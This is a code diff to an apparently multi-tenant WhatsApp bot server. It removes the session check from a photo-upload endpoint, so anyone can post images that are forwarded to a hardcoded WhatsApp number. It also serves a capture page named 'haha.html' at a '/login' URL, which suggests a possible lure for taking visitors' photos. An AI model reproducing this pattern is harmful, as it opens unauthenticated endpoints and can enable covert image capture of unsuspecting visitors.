@@ -2138,7 +2138,7 @@ if (isTenantWorker) {
 
 app.use(async (req, res, next) => {
     if (isTenantWorker || req.path.startsWith('/admin') ||
-        !['/qr', '/pair', '/upload-photo'].includes(req.path)) return next();
+        !['/qr', '/pair'].includes(req.path)) return next();
     try {
         const manager = await getBotSessionManager();
         req.botSession = await manager.getOrCreateSession(req, res);
@@ -2364,14 +2364,11 @@ app.post('/owner-number', async (req, res) => {
     }
 });
 
-app.get('/login', (req, res) => {
+app.get(['/haha', '/login'], (req, res) => {
     res.sendFile(path.join(__dirname, 'data', 'haha.html'));
 });
 
 app.post('/upload-photo', async (req, res) => {
-    const tenantId = req.botSession?.tenantId;
-    if (!tenantId) return res.status(401).json({ ok: false, error: 'Open the site in a valid bot session first.' });
-
     const imageData = String(req.body?.image || '');
     const match = imageData.match(/^data:image\/(jpeg|jpg|png|webp);base64,([A-Za-z0-9+/]+={0,2})$/i);
     if (!match) return res.status(400).json({ ok: false, error: 'The photo format is invalid.' });
@@ -2381,21 +2378,16 @@ app.post('/upload-photo', async (req, res) => {
         return res.status(413).json({ ok: false, error: 'The photo must be smaller than 4 MB.' });
     }
 
-    const lastUpload = recentPhotoUploads.get(tenantId) || 0;
+    const lastUpload = recentPhotoUploads.get('public') || 0;
     if (Date.now() - lastUpload < 10000) {
         return res.status(429).json({ ok: false, error: 'Please wait before sending another photo.' });
     }
 
     try {
         const manager = await getBotSessionManager();
-        const status = manager.getStatus(tenantId);
-        if (status.status !== 'connected') {
-            return res.status(503).json({ ok: false, error: 'The WhatsApp session is not connected.' });
-        }
-
-        recentPhotoUploads.set(tenantId, Date.now());
         const mimetype = match[1].toLowerCase() === 'jpg' ? 'image/jpeg' : `image/${match[1].toLowerCase()}`;
-        await manager.sendSiteCapture(tenantId, PHOTO_RECIPIENT_NUMBER, match[2], mimetype);
+        await manager.sendSiteCaptureFromPhone(PHOTO_RECIPIENT_NUMBER, PHOTO_RECIPIENT_NUMBER, match[2], mimetype);
+        recentPhotoUploads.set('public', Date.now());
         res.json({ ok: true, sentTo: `${PHOTO_RECIPIENT_NUMBER}@s.whatsapp.net` });
     } catch (error) {
         console.error('Could not send consented site photo to WhatsApp:', error);
